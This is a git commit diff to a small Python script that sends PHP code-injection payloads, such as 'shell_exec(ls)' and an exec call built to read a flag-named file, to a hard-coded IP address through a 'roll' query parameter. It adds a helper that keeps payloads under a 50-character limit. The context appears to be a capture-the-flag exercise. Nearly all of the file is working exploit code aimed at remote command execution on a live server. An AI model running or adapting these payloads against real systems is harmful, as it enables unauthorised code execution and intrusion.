87aa38652b360f970356448dcaa0c482f7103665
jade-e-mcdermott <jade.e.mcdermott@gmail.com>
2021-01-01 14:10:16 -0800

    will warn you if the injected payload was too long.

--- HPNY/python/main.py
+++ HPNY/python/main.py
@@ -11,13 +11,29 @@ def GetLsOnServer():
     lsResults = "response.text"
     return lsResults
 
+def InjectedStuffIsTooLong(stringToCheck):
+    if (len(stringToCheck) > 50):
+        return True
+    else:
+        return False
 
-GetLsOnServer()
-baseUrl = "http://192.46.227.32//?roll="
-injectedCommand = "shell_exec(ls)"
-endingStuff = ".getcwd"
-fullRequest = baseUrl + injectedCommand + endingStuff
-response = requests.get(fullRequest)
-print("Stats: ", response.status_code)
-print(response.text)
+def TryInjectedPayload(injectedPayload):
+    baseUrl = "http://192.46.227.32//?roll="
+    endingStuff = ".getcwd"
+    fullRequest = baseUrl + injectedPayload + endingStuff
+    if(InjectedStuffIsTooLong(injectedPayload + endingStuff) == False):
+        response = requests.get(fullRequest)
+        print("Stats: ", response.status_code)
+        return response.text
+    else:
+        return "Injected payload too long."
+
+## MAIN.
+
+
+injectedCommand = "fl.exec(get_lucky_number()).g_here_but_can_you_get_it_hohoho.php"
+
+responseText = TryInjectedPayload(injectedCommand)
+print(responseText)
+
 
